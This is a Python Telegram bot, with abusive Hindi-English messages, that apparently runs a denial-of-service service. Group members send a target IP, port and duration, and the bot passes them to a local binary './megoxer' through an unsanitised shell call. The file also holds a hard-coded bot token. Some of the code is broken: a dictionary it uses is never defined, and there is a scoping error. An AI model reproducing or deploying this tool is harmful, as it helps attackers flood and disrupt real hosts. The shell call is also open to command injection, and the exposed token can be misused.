#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# Telegram bot token (इसको `.env` में रखना सेफ रहेगा)
bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Global variables
is_attack_running = False
attack_end_time = None
update_thread = None

# Function to check if user is in channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['RS'])
def handle_attack(message):
    global is_attack_running, attack_end_time, update_thread
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **ABE CHUTIYE! YE BOT SIRF GROUP ME CHALTA HAI! BHAAG YAHA SE!** ❌", reply_to_message_id=message.message_id)
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KAR BSDK, WARNA KUCH NAHI MILEGA!** {CHANNEL_USERNAME}", reply_to_message_id=message.message_id)
        return

    if is_attack_running and attack_end_time:
        sent_msg = bot.send_message(message.chat.id, "⏳ **CHECK KAR RAHE HAIN BSDK...**", reply_to_message_id=message.message_id)
        
        def update_check_status():
            while is_attack_running:
                remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
                if remaining_time <= 0:
                    bot.edit_message_text("✅ **ATTACK KHATAM BSDK! AB NAYA LAGA!**", message.chat.id, sent_msg.message_id)
                    return
                try:
                    bot.edit_message_text(
                        f"⏳ **ATTACK CHAL RAHA HAI BSDK! BAAKI TIME: {int(remaining_time)}s**",
                        message.chat.id,
                        sent_msg.message_id
                    )
                except:
                    pass  
                time.sleep(1)

        threading.Thread(target=update_check_status).start()
        return  

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **USAGE: /RS  <IP>  <PORT>  <TIME> **\n😎 **SAHI LIKH CHUTIYE! WARNA GAAND MAAR LENGE!**", reply_to_message_id=message.message_id)
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE! KITNA GANJA PHOONK RAHA HAI BSDK?**", reply_to_message_id=message.message_id)
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **180 SEC SE ZYADA NAHI MILEGA! TERI MAA KO BHI NAHI!**", reply_to_message_id=message.message_id)
        return

    sent_msg = bot.send_message(message.chat.id, f"""⚡ **ATTACK CONFIRMED CHUTIYE!**  
🎯 **TARGET:** `{target}`  
🔢 **PORT:** `{port}`  
⏳ **DURATION:** `{time_duration}s`  
🚀 **JA BETA, ATTACK CHALU HO GAYA!**""", parse_mode="Markdown", reply_to_message_id=message.message_id)

    bot.send_message(message.chat.id, "📸 **ATTACK LAG GAYA BSDK! SCREENSHOT BHEJ AB!**", reply_to_message_id=message.message_id)

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)

    def update_attack_status():
        while is_attack_running:
            remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
            if remaining_time <= 0:
                bot.edit_message_text("✅ **ATTACK KHATAM BSDK! AB SCREENSHOT BHEJ!** 📸", message.chat.id, sent_msg.message_id)
                is_attack_running = False
                return
            try:
                bot.edit_message_text(
                    f"""🔥 **ATTACK CHALU HAI BSDK!** 🔥  
🎯 **TARGET:** `{target}`  
🔢 **PORT:** `{port}`  
⏳ **BAAKI TIME:** `{int(remaining_time)}s`  
🚀 **GAAND MAT MARA , SCREENSHOT READY RAKH!**""",
                    message.chat.id,
                    sent_msg.message_id
                )
            except:
                pass  
            time.sleep(1)  

    threading.Thread(target=update_attack_status).start()

    try:
        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA BSDK! TERI NASEEB HI KHARAB HAI!**", reply_to_message_id=message.message_id)
        is_attack_running = False
        attack_end_time = None
        return

    is_attack_running = False
    attack_end_time = None

# Handle screenshot submission and forward to main channel
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  
        bot.send_message(CHANNEL_USERNAME, f"📸 **User `{user_id}` ka screenshot hai!**")

        bot.reply_to(message, "✅ **Screenshot mil gaya! Ab tu naya attack laga sakta hai.** 🚀")
        del pending_feedback[user_id]  
    else:
        bot.reply_to(message, "❌ **Ab screenshot bhejne ki zaroorat nahi hai!**")

@bot.message_handler(commands=['check'])
def handle_check(message):
    if is_attack_running and attack_end_time:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"⏳ **GAAND MARA MAT BSDK, ATTACK CHAL RAHA HAI! BAAKI TIME: {int(remaining_time)}s**", reply_to_message_id=message.message_id)
    else:
        bot.reply_to(message, "✅ **ATTACK KHATAM! AB NAYA LAGA CHUTIYE!**", reply_to_message_id=message.message_id)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 OYE {user_name}! 🔥🌟  

🚀 **BSDK READY HO JAA!**  
💥 ATTACK KARNE KA FULL CHANCE HAI!  

🔗 **GROUP JOIN KAR WARNA BSDK BAN JAYEGA!**  
👉 [TELEGRAM GROUP](https://t.me/R_SDanger_op) 🚀🔥""" 
    
    bot.reply_to(message, response, parse_mode="Markdown", reply_to_message_id=message.message_id)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(1)